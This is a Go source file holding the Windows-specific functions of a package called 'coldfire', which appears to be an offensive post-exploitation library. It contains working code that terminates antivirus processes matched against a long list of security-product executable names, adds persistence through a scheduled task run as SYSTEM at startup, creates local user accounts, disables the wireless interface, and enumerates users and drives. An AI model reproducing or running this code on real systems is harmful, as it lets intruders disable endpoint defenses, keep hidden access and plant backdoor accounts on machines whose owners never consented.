//go:build windows
// +build windows

package coldfire

import (
	"fmt"
	"os"
	"strings"

	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
)

func killProcByPID(pid int) error {
	kernel32dll := windows.NewLazyDLL("Kernel32.dll")
	OpenProcess := kernel32dll.NewProc("OpenProcess")
	TerminateProcess := kernel32dll.NewProc("TerminateProcess")
	op, _, _ := OpenProcess.Call(0x0001, 1, uintptr(pid))
	//protip:too much error handling can screw things up
	_, _, err2 := TerminateProcess.Call(op, 9)
	return err2
}

func isRoot() bool {
	root := true

	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		root = false
	}

	return root
}

func userinfo() string {
	user, err := cmdOut("query user")
	if err != nil {
		user = "N/A"
	}

	return user
}

func pkillAv() error {
	av_processes := []string{
		"advchk.exe", "ahnsd.exe", "alertsvc.exe", "alunotify.exe", "autodown.exe", "avmaisrv.exe",
		"avpcc.exe", "avpm.exe", "avsched32.exe", "avwupsrv.exe", "bdmcon.exe", "bdnagent.exe", "bdoesrv.exe",
		"bdss.exe", "bdswitch.exe", "bitdefender_p2p_startup.exe", "cavrid.exe", "cavtray.exe", "cmgrdian.exe",
		"doscan.exe", "dvpapi.exe", "frameworkservice.exe", "frameworkservic.exe", "freshclam.exe", "icepack.exe",
		"isafe.exe", "mgavrtcl.exe", "mghtml.exe", "mgui.exe", "navapsvc.exe", "nod32krn.exe", "nod32kui.exe",
		"npfmntor.exe", "nsmdtr.exe", "ntrtscan.exe", "ofcdog.exe", "patch.exe", "pav.exe", "pcscan.exe",
		"poproxy.exe", "prevsrv.exe", "realmon.exe", "savscan.exe", "sbserv.exe", "scan32.exe", "spider.exe",
		"tmproxy.exe", "trayicos.exe", "updaterui.exe", "updtnv28.exe", "vet32.exe", "vetmsg.exe", "vptray.exe",
		"vsserv.exe", "webproxy.exe", "webscanx.exe", "xcommsvr.exe"}

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func wifiDisconnect() error {
	cmd := `netsh interface set interface name="Wireless Network Connection" admin=DISABLED`
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func addPersistentCommand(cmd string) error {
	_, err := cmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
	return err
}

func CreateUser(username, password string) error {
	cmd := f("net user %s %s /ADD", username, password)

	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func disks() ([]string, error) {
	found_drives := []string{}

	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":\\")
		if err == nil {
			found_drives = append(found_drives, string(drive)+":\\")
			f.Close()
		}
	}
	return found_drives, nil
}

func users() ([]string, error) {
	clear := []string{}
	o, err := cmdOut("net user")
	if err != nil {
		return nil, err
	}

	lines := strings.Split(o, "\n")

	for l := range lines {
		line := lines[l]
		if !ContainsAny(line, []string{"accounts for", "------", "completed"}) {
			clear = append(clear, line)
		}
	}

	return clear, nil
	// return strings.Fields(strings.Join(clear, " ")), nil
	// usrs := []string{}
	//   users, err := wapi.ListLoggedInUsers()
	//   if err != nil {
	//       return nil, err
	//   }
	//   for _, u := range(users){
	//       usrs = append(usrs, u.FullUser())
	//   }
	//   return usrs, nil
}
